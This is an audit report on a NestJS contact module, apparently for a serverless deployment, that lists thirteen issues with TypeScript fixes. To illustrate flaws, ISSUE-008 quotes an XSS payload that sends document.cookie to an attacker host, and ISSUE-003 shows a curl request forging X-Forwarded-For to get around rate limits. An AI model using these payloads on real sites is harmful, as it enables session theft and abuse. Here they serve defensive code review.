# Contact Module — Code Audit Report

> **Audited by:** Senior NestJS Developer  
> **Date:** 2026-06-06  
> **Module path:** `src/contact/`  
> **Deployment target:** Serverless (free tier — stateless, ephemeral instances)  
> **Scope:** Security · Performance · Clean Code · Rate Limiting · Reusability

---

## Files Analyzed

| File | Role |
|------|------|
| `contact.module.ts` | Module declaration |
| `contact.controller.ts` | Admin-protected REST endpoints |
| `contact.public.controller.ts` | Public submission endpoint |
| `contact.service.ts` | Business logic |
| `dto/create-contact-message.dto.ts` | Input validation DTO |
| `dto/contact-query.dto.ts` | Pagination/filter DTO |
| `schema/contact-message.schema.ts` | TypeORM entity |

---

## Executive Summary

The contact module is **structurally sound** and follows NestJS conventions well. The split between a public controller and an admin controller is a clean pattern. However, several issues exist across security, performance, rate limiting, and reusability dimensions — each of which is critical for a serverless deployment on a free-tier host.

---

## Issues & Fixes

---

### [ISSUE-001] `ContactModule` is NOT registered in `AppModule`

**Severity:** 🔴 Critical  
**Category:** Configuration  
**File:** `src/app.module.ts`

**Problem:**  
The `ContactModule` is never imported in `AppModule`. The contact endpoints are entirely dead — no routes are registered, no requests can reach them.

```
// app.module.ts — ContactModule is MISSING from the imports array
imports: [
  AuthModule,
  UserModule,
  MailModule,
  NotificationsModule,
  PaymentsModule,
  CategoriesModule,
  BlogModule,
  ProductsModule,
  CartModule,
  OrderModule,
  // ❌ ContactModule is not here
],
```

**Fix:**  
Add `ContactModule` to the `imports` array in `AppModule`.

```typescript
// app.module.ts
import { ContactModule } from './contact/contact.module';

@Module({
  imports: [
    // ... other modules
    ContactModule, // ✅ Add this
  ],
})
export class AppModule {}
```

---

### [ISSUE-002] In-memory throttler state is lost on every serverless cold start

**Severity:** 🔴 Critical  
**Category:** Rate Limiting · Serverless Compatibility  
**File:** `src/config/throttler.config.ts`, `src/contact/contact.public.controller.ts`

**Problem:**  
`@nestjs/throttler` defaults to **in-memory** storage (a simple `Map`). On a serverless or free-tier host:

- Each function invocation or container restart spawns a fresh process.
- The in-memory throttler state is wiped on every cold start.
- An attacker can trivially bypass the `5 submissions per hour` limit by triggering a cold start (waiting a few seconds between calls or using different regions/IPs).
- The `@Throttle({ default: { ttl: 3600000, limit: 5 } })` decorator on the `POST /contact` endpoint is therefore **ineffective** in a serverless environment.

**Fix — Option A (Recommended for free tier): Redis-backed throttler**  
Use `@nestjs-throttler/storage-redis` to persist throttle state externally. Free Redis is available via Upstash or Railway.

```typescript
// throttler.config.ts
import { ThrottlerStorageRedisService } from '@nestjs-throttler/storage-redis';
import Redis from 'ioredis';

export const throttlerConfig: ThrottlerModuleOptions = {
  throttlers: [
    { name: 'short', ttl: 1000, limit: 5 },
    { name: 'long',  ttl: 60000, limit: 100 },
  ],
  storage: new ThrottlerStorageRedisService(
    new Redis(process.env.REDIS_URL!),
  ),
};
```

**Fix — Option B (DB-backed, no Redis): Custom ThrottlerStorage using TypeORM**  
Implement a `ThrottlerStorageService` that writes to a `throttle_hits` table. Suitable when Redis is not available, since the DB is already available.

```typescript
// src/config/db-throttler.storage.ts
import { Injectable } from '@nestjs/common';
import { ThrottlerStorage } from '@nestjs/throttler';
import { InjectDataSource } from '@nestjs/typeorm';
import { DataSource } from 'typeorm';

@Injectable()
export class DbThrottlerStorage implements ThrottlerStorage {
  constructor(@InjectDataSource() private readonly ds: DataSource) {}

  async getRecord(key: string): Promise<number[]> {
    const rows = await this.ds.query(
      `SELECT hit_time FROM throttle_hits WHERE key = $1 AND hit_time > $2`,
      [key, Date.now() - 3600000],
    );
    return rows.map((r: { hit_time: number }) => r.hit_time);
  }

  async addRecord(key: string, ttl: number): Promise<void> {
    await this.ds.query(
      `INSERT INTO throttle_hits (key, hit_time, expires_at)
       VALUES ($1, $2, $3)`,
      [key, Date.now(), Date.now() + ttl],
    );
  }
}
```

---

### [ISSUE-003] `POST /contact` does not guard against IP spoofing

**Severity:** 🟠 High  
**Category:** Security  
**File:** `src/contact/contact.public.controller.ts` (lines 13–20)

**Problem:**  
The `extractClientIp` function trusts the `X-Forwarded-For` header unconditionally without validating whether it comes from a trusted proxy. This allows anyone to forge their IP:

```bash
curl -X POST /contact \
  -H "X-Forwarded-For: 1.2.3.4" \
  -d '{ ... }'
```

Every request will appear to come from `1.2.3.4`, bypassing IP-based throttling entirely.

**Fix:**  
Configure NestJS to use the Express `trust proxy` setting, which makes `request.ip` return the real client IP as determined by the proxy chain. Remove the manual header parsing.

```typescript
// main.ts
const app = await NestFactory.create(AppModule);
app.set('trust proxy', 1); // Trust exactly 1 hop (your hosting reverse proxy)
```

```typescript
// contact.public.controller.ts — simplified, no manual XFF parsing needed
async create(@Body() dto: CreateContactMessageDto, @Req() request: Request) {
  return this.contactService.create(dto, request.ip ?? 'unknown');
}
```

> **Note:** Remove the `extractClientIp` helper function entirely after applying this fix. It becomes dead code and is a security risk as it may be reused elsewhere.

---

### [ISSUE-004] No duplicate submission guard (same email, same subject within a time window)

**Severity:** 🟠 High  
**Category:** Security · Performance  
**File:** `src/contact/contact.service.ts`

**Problem:**  
There is no deduplication check before saving a new contact message. A user (or bot) can submit the exact same message content or the same email address hundreds of times, even if rate limiting works correctly — because rate limiting only throttles by IP, not by email identity.

**Fix:**  
Add a duplicate check within the service's `create` method before persisting. Check if a message from the same email was submitted within a configurable cooldown window (e.g., 1 hour).

```typescript
// contact.service.ts
import { ConflictException } from '@nestjs/common';

async create(dto: CreateContactMessageDto, ipAddress: string) {
  const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);

  const recentDuplicate = await this.contactMessageRepository.findOne({
    where: { email: dto.email },
    order: { createdAt: 'DESC' },
  });

  if (recentDuplicate && recentDuplicate.createdAt > oneHourAgo) {
    throw new ConflictException(
      'A message from this email was already submitted recently. Please wait before submitting again.',
    );
  }

  // ... rest of creation logic
}
```

> **Reusability note:** The cooldown window should be injected via a config option rather than hardcoded, so it can be customized per project.

---

### [ISSUE-005] `sortBy` injection risk — unsanitized order column passed directly to TypeORM query

**Severity:** 🟠 High  
**Category:** Security  
**File:** `src/contact/contact.service.ts` (line 73)

**Problem:**  
The `sortBy` value from the query string is passed directly into the `order` object:

```typescript
order: { [sortBy]: order },
```

Although `PaginationQueryDto` uses `@IsIn(SORT_FIELDS)` to whitelist values, if validation is bypassed or `SORT_FIELDS` grows without review, this pattern can lead to unexpected column enumeration or errors. More critically, `SORT_FIELDS` in `pagination-query.dto.ts` contains fields like `amount`, `viewsCount`, `publishedAt`, `title` — none of which exist on `ContactMessage`. The DTO is reused across modules with a **shared, generic field whitelist** that is not specific to the contact entity.

**Fix:**  
Define a contact-specific sort field whitelist in `ContactQueryDto` instead of inheriting the generic one. Override the `sortBy` property:

```typescript
// dto/contact-query.dto.ts
export const CONTACT_SORT_FIELDS = ['createdAt', 'updatedAt'] as const;
export type ContactSortField = (typeof CONTACT_SORT_FIELDS)[number];

export class ContactQueryDto extends PaginationQueryDto {
  // Override sortBy to restrict to contact-relevant fields only
  @ApiPropertyOptional({ enum: CONTACT_SORT_FIELDS, default: 'createdAt' })
  @IsOptional()
  @IsIn(CONTACT_SORT_FIELDS)
  declare sortBy?: ContactSortField;

  // ... isRead field
}
```

---

### [ISSUE-006] `findAll` admin endpoint — no cap on `limit` appropriate for a public-facing admin

**Severity:** 🟡 Medium  
**Category:** Performance · Serverless Compatibility  
**File:** `src/contact/contact.service.ts` (line 69), `src/common/dto/pagination-query.dto.ts` (line 52)

**Problem:**  
`PaginationQueryDto` allows `limit` up to **1000**. On a serverless function with a free DB connection pool, a request of `GET /admin/contact?limit=1000` will:

1. Fetch 1,000 full `ContactMessage` rows (including the `message: text` column, which can be up to 5,000 chars each).
2. Serialize all rows to JSON and send them over the network.
3. Potentially exceed the serverless function's memory/timeout limits on free tiers.

**Fix:**  
Lower the maximum `limit` for the admin contact list endpoint. Override `limit` in `ContactQueryDto`:

```typescript
// dto/contact-query.dto.ts
export class ContactQueryDto extends PaginationQueryDto {
  @ApiPropertyOptional({ description: 'Items per page', default: 20, maximum: 100 })
  @IsOptional()
  @Type(() => Number)
  @IsInt()
  @Min(1)
  @Max(100) // ✅ Tighten to a safe value for serverless
  declare limit?: number;

  // ...
}
```

---

### [ISSUE-007] `markAsRead` and `markAsReplied` use raw `.update()` — no optimistic locking or existence pre-check

**Severity:** 🟡 Medium  
**Category:** Clean Code · Correctness  
**File:** `src/contact/contact.service.ts` (lines 94–129)

**Problem:**  
`markAsRead` and `markAsReplied` use `repository.update(id, { ... })` and then check `result.affected === 0`. While this works for the "not found" case, there are two subtle problems:

1. **`markAsReplied` can overwrite an existing `repliedAt` timestamp** — calling this endpoint twice silently updates `repliedAt` to the new timestamp, losing the original reply date.
2. **`markAsRead` is a no-op when already read**, but returns a success response with no indication that nothing changed, which is misleading for callers.

**Fix:**  
Add idempotency guards for both methods:

```typescript
// contact.service.ts
async markAsRead(id: string) {
  const contact = await this.findOneOrFail(id);
  if (contact.isRead) {
    // Already read — return current state without a DB write
    return { id, isRead: true, message: 'Message was already marked as read' };
  }
  await this.contactMessageRepository.update(id, { isRead: true });
  return { id, isRead: true, message: 'Message marked as read' };
}

async markAsReplied(id: string) {
  const contact = await this.findOneOrFail(id);
  if (contact.repliedAt) {
    // Already replied — preserve the original timestamp
    return { id, isRead: contact.isRead, repliedAt: contact.repliedAt, message: 'Message was already marked as replied' };
  }
  const repliedAt = new Date();
  await this.contactMessageRepository.update(id, { isRead: true, repliedAt });
  return { id, isRead: true, repliedAt, message: 'Message marked as replied' };
}
```

> **Cost note for serverless:** The extra `findOneOrFail` SELECT is a deliberate trade-off — it prevents a silent data overwrite, which is worth the extra DB round-trip.

---

### [ISSUE-008] `fullName` field has no sanitization against HTML/script injection

**Severity:** 🟡 Medium  
**Category:** Security  
**File:** `src/contact/dto/create-contact-message.dto.ts` (line 15)

**Problem:**  
`fullName`, `subject`, and `message` fields accept arbitrary strings. If the admin panel renders these in a browser without escaping, they become XSS vectors. `class-validator` confirms the type as a string but does not strip HTML tags or script payloads.

Example malicious input:
```
fullName: "<script>alert('xss')</script>John"
message: "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"
```

**Fix:**  
Add a custom `@Transform` decorator to strip HTML from string fields before persisting. Use the `sanitize-html` or `dompurify` package (server-side via jsdom):

```typescript
// dto/create-contact-message.dto.ts
import { Transform } from 'class-transformer';
import sanitizeHtml from 'sanitize-html';

function stripHtml(value: unknown): string {
  if (typeof value !== 'string') return '';
  return sanitizeHtml(value, { allowedTags: [], allowedAttributes: {} }).trim();
}

export class CreateContactMessageDto {
  @Transform(({ value }) => stripHtml(value))
  @IsString()
  @IsNotEmpty()
  @MaxLength(100)
  fullName: string;

  // Apply the same transform to subject and message
  @Transform(({ value }) => stripHtml(value))
  @IsString()
  @IsNotEmpty()
  @MaxLength(200)
  subject: string;

  @Transform(({ value }) => stripHtml(value))
  @IsString()
  @IsNotEmpty()
  @MinLength(10)
  @MaxLength(5000)
  message: string;
}
```

---

### [ISSUE-009] No `@ApiResponse` for HTTP 409 (Conflict) on the public submit endpoint

**Severity:** 🟢 Low  
**Category:** Clean Code · API Documentation  
**File:** `src/contact/contact.public.controller.ts`

**Problem:**  
After applying the deduplication fix from ISSUE-004, a `409 Conflict` response can be returned by the endpoint. It is not documented in the Swagger spec, misleading API consumers.

**Fix:**  
Add the missing `@ApiResponse` decorator once deduplication is implemented:

```typescript
@Post()
@Throttle({ default: { ttl: 3600000, limit: 5 } })
@ApiOperation({ summary: 'Submit a contact message' })
@ApiResponse({ status: 201, description: 'Message submitted successfully' })
@ApiResponse({ status: 400, description: 'Validation error' })
@ApiResponse({ status: 409, description: 'A message from this email was already submitted recently' }) // ✅ Add
@ApiResponse({ status: 429, description: 'Rate limit exceeded — max 5 per hour' })
async create(@Body() dto: CreateContactMessageDto, @Req() request: Request) { ... }
```

---

### [ISSUE-010] Missing database index on `email` column (needed for deduplication query)

**Severity:** 🟢 Low  
**Category:** Performance  
**File:** `src/contact/schema/contact-message.schema.ts`

**Problem:**  
Once the deduplication check (ISSUE-004) is added, a `WHERE email = $1` query will be executed on every `POST /contact` request. Without an index, this is a full-table scan — slow as the `contact_messages` table grows.

**Fix:**  
Add a database index on the `email` column in the entity:

```typescript
// schema/contact-message.schema.ts
@Entity('contact_messages')
@Index('idx_contact_messages_is_read', ['isRead'])
@Index('idx_contact_messages_created_at', ['createdAt'])
@Index('idx_contact_messages_email', ['email']) // ✅ Add for deduplication queries
export class ContactMessage {
  // ...
}
```

Then generate and run a migration:
```bash
pnpm run migration:generate -- --name AddContactEmailIndex
pnpm run migration:run
```

---

### [ISSUE-011] `ContactModule` does not export `ContactService` — cannot be reused by other modules

**Severity:** 🟢 Low  
**Category:** Reusability  
**File:** `src/contact/contact.module.ts`

**Problem:**  
The module declares `ContactService` as a provider but does not export it. If another module (e.g., a `NotificationsModule` or `ReportsModule`) wants to query contact messages or integrate with the service, it cannot do so without duplicating the code or importing the entity directly.

**Fix:**  
Export `ContactService` from the module:

```typescript
// contact.module.ts
@Module({
  imports: [TypeOrmModule.forFeature([ContactMessage])],
  controllers: [ContactController, ContactPublicController],
  providers: [ContactService],
  exports: [ContactService], // ✅ Add this
})
export class ContactModule {}
```

---

### [ISSUE-012] Hard coupling to `src/auth` module paths reduces reusability in other projects

**Severity:** 🟢 Low  
**Category:** Reusability  
**File:** `contact.controller.ts` (lines 12–13), `contact.public.controller.ts` (line 5)

**Problem:**  
The contact module imports directly from the auth module:
```typescript
import { Roles } from '../auth/decorators/Roles.decorator';
import { UserRoleEnum } from '../auth/types/UserRoleEnum';
import { Public } from '../auth/decorators/public.decorator';
```

When this module is copied to another project with a different auth structure, these paths will break and require manual updates. This is an anti-pattern for a boilerplate module.

**Fix:**  
Move shared auth decorators and enums into a `src/common/` barrel or a dedicated `src/shared/auth/` package. The contact module (and all domain modules) should import from a stable common path:

```typescript
// Preferred import style for reusability
import { Roles, Public } from '../common/decorators';
import { UserRoleEnum } from '../common/enums';
```

As a minimum step, document this coupling in the module's README so that developers porting it to another project know to update these imports.

---

### [ISSUE-013] `@Throttle` on the public controller overrides the global throttler but silently — no `ThrottlerGuard` explicitly attached

**Severity:** 🟢 Low  
**Category:** Rate Limiting · Clean Code  
**File:** `src/contact/contact.public.controller.ts` (line 29)

**Problem:**  
The `@Throttle` decorator works **only** because `ThrottlerGuard` is registered globally in `AppModule` as an `APP_GUARD`. This is an implicit dependency — someone reading only the contact module cannot determine how rate limiting is enforced without reading `AppModule`.

The global short-throttle (`5 req/sec`, `100 req/min`) from `throttlerConfig` still applies alongside the `@Throttle` override. The interaction between the global throttler and the per-endpoint override is not documented, creating confusion.

**Fix:**  
Add a comment explaining the dependency, and explicitly document which throttle strategy applies:

```typescript
/**
 * Rate limiting: overrides the global throttler for this endpoint.
 * Enforces a maximum of 5 submissions per hour per IP.
 * The global ThrottlerGuard (registered in AppModule) is required for this decorator to take effect.
 *
 * ⚠️ On serverless: in-memory throttle state resets on cold starts. See ISSUE-002 for fix.
 */
@Post()
@Throttle({ default: { ttl: 3600_000, limit: 5 } })
async create(...) {}
```

---

## Endpoint-by-Endpoint Risk Summary

| Endpoint | Method | Auth | Throttled | Key Risks |
|----------|--------|------|-----------|-----------|
| `POST /contact` | Public | None | ✅ (broken — see ISSUE-002) | IP spoof (ISSUE-003), HTML injection (ISSUE-008), no dedup (ISSUE-004) |
| `GET /admin/contact` | Admin | JWT + Role | ❌ | Limit=1000 DoS (ISSUE-006), wrong sort fields (ISSUE-005) |
| `GET /admin/contact/:id` | Admin | JWT + Role | ❌ | No caching — DB hit on every request |
| `PATCH /admin/contact/:id/read` | Admin | JWT + Role | ❌ | Silent no-op when already read (ISSUE-007) |
| `PATCH /admin/contact/:id/reply` | Admin | JWT + Role | ❌ | Overwrites `repliedAt` timestamp (ISSUE-007) |
| `DELETE /admin/contact/:id` | Admin | JWT + Role | ❌ | No soft-delete — data lost permanently |

---

## Serverless Compatibility Checklist

| Concern | Status | Notes |
|---------|--------|-------|
| Stateless service logic | ✅ | Service is stateless |
| No in-memory caches | ⚠️ | Throttler uses in-memory store (ISSUE-002) |
| Cold-start safe | ⚠️ | Rate limiting breaks on cold start |
| DB connection pooling aware | ✅ | TypeORM pool is managed at module level |
| Function timeout risk | ⚠️ | `limit=1000` query can timeout (ISSUE-006) |
| No background jobs in module | ✅ | Clean for serverless |

---

## Reusability Checklist (for porting to other projects)

| Item | Status | Notes |
|------|--------|-------|
| Module exports `ContactService` | ❌ | Add `exports` array (ISSUE-011) |
| Module registered in `AppModule` | ❌ | Missing import (ISSUE-001) |
| Auth decorators path-independent | ❌ | Hard-coded `../auth/` paths (ISSUE-012) |
| Entity has no cross-module FK | ✅ | Clean standalone entity |
| DTO extends common base | ✅ | Uses `PaginationQueryDto` |
| No environment-specific hardcoding | ✅ | No hardcoded URLs or secrets |
| Swagger docs complete | ⚠️ | Missing 409 response (ISSUE-009) |

---

## Priority Fix Order

| Priority | Issue | Effort | Impact |
|----------|-------|--------|--------|
| 1 | ISSUE-001 — Register `ContactModule` | ⚡ Minutes | 🔴 Module is completely non-functional |
| 2 | ISSUE-002 — Persist throttler state | 🕐 Hours | 🔴 Rate limiting is bypassed on serverless |
| 3 | ISSUE-003 — Fix IP trust config | ⚡ Minutes | 🟠 Throttle bypass via IP spoofing |
| 4 | ISSUE-004 — Add email deduplication | 🕐 Hours | 🟠 Spam/flood via multiple submissions |
| 5 | ISSUE-005 — Fix sort field whitelist | ⚡ Minutes | 🟠 Wrong fields available for contact entity |
| 6 | ISSUE-006 — Cap `limit` at 100 | ⚡ Minutes | 🟡 Function timeout risk |
| 7 | ISSUE-007 — Idempotent mark methods | 🕐 Hours | 🟡 Silent data overwrite |
| 8 | ISSUE-008 — HTML sanitization | 🕐 Hours | 🟡 XSS in admin view |
| 9 | ISSUE-010 — Add email DB index | ⚡ Minutes | 🟢 Performance of dedup query |
| 10 | ISSUE-011 — Export `ContactService` | ⚡ Minutes | 🟢 Reusability |
| 11 | ISSUE-012 — Decouple auth imports | 🕐 Hours | 🟢 Portability |
| 12 | ISSUE-009 — Swagger 409 response | ⚡ Minutes | 🟢 Documentation |
| 13 | ISSUE-013 — Comment throttle dependency | ⚡ Minutes | 🟢 Developer clarity |

---

## What Is Done Well ✅

- The split between `ContactController` (admin) and `ContactPublicController` (public) is a clean, idiomatic NestJS pattern.
- `@Roles(UserRoleEnum.ADMIN)` is applied at the class level in the admin controller — no route is accidentally left unprotected.
- `ParseUUIDPipe` is used on all UUID params — prevents invalid UUID crashes.
- The entity has meaningful indexes (`isRead`, `createdAt`) for the most common query patterns.
- `findOneOrFail` is a clean private helper that centralizes the 404 throw.
- The `extractClientIp` function at least attempts to handle reverse-proxy headers (though it needs the trust-proxy fix).
- DTOs enforce `MaxLength` on all string fields — no unbounded input.
- `@IsEmail()` is used for email validation.
- `repliedAt` is nullable, correctly modeling the "not yet replied" state.

---

*Report generated by automated audit — 2026-06-06*
